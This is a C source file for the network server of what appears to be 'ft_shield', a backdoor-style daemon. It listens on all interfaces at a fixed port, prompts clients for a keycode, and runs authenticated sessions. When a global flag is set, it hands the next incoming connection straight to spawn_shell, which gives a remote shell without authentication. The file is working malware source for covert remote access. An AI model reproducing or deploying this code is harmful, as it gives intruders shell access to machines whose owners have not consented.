#include "ft_shield.h"

int			g_pending_shell = 0;
static t_client		g_cli[MAX_CLI];
static int		g_listen = -1;

static void	free_slot(t_client *c)
{
	if (c->fd >= 0)
		close(c->fd);
	c->fd = -1;
	c->tries = 0;
	c->authed = 0;
}

static int	has_free_slot(void)
{
	int	i;

	i = 0;
	while (i < MAX_CLI)
	{
		if (g_cli[i].fd < 0)
			return (1);
		i++;
	}
	return (0);
}

static int	make_listener(void)
{
	struct sockaddr_in	sa;
	int			fd;
	int			one;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		return (-1);
	one = 1;
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = htonl(INADDR_ANY);
	sa.sin_port = htons(PORT);
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0)
		return (close(fd), -1);
	if (listen(fd, 8) != 0)
		return (close(fd), -1);
	return (fd);
}

static void	accept_new(void)
{
	int	fd;
	int	i;

	fd = accept(g_listen, NULL, NULL);
	if (fd < 0)
		return ;
	if (g_pending_shell)
	{
		g_pending_shell = 0;
		spawn_shell(fd);
		return ;
	}
	i = 0;
	while (i < MAX_CLI)
	{
		if (g_cli[i].fd < 0)
		{
			g_cli[i].fd = fd;
			g_cli[i].tries = 0;
			g_cli[i].authed = 0;
			send_str(fd, "Keycode: ");
			return ;
		}
		i++;
	}
	close(fd);
}

static void	handle_client(t_client *c)
{
	int	r;

	if (c->authed)
		r = session_step(c);
	else
		r = auth_step(c);
	if (r < 0)
		free_slot(c);
}

int	run_server(void)
{
	struct pollfd	pfd[1 + MAX_CLI];
	int		i;
	int		n;

	g_listen = make_listener();
	if (g_listen < 0)
		return (-1);
	i = 0;
	while (i < MAX_CLI)
		g_cli[i++].fd = -1;
	while (1)
	{
		pfd[0].fd = has_free_slot() ? g_listen : -1;
		pfd[0].events = POLLIN;
		pfd[0].revents = 0;
		i = 0;
		while (i < MAX_CLI)
		{
			pfd[1 + i].fd = g_cli[i].fd;
			pfd[1 + i].events = POLLIN;
			pfd[1 + i].revents = 0;
			i++;
		}
		n = poll(pfd, 1 + MAX_CLI, -1);
		if (n < 0)
		{
			if (errno == EINTR)
				continue ;
			return (-1);
		}
		if (pfd[0].revents & POLLIN)
			accept_new();
		i = 0;
		while (i < MAX_CLI)
		{
			if (g_cli[i].fd >= 0
				&& (pfd[1 + i].revents & (POLLIN | POLLHUP | POLLERR)))
				handle_client(&g_cli[i]);
			i++;
		}
	}
}

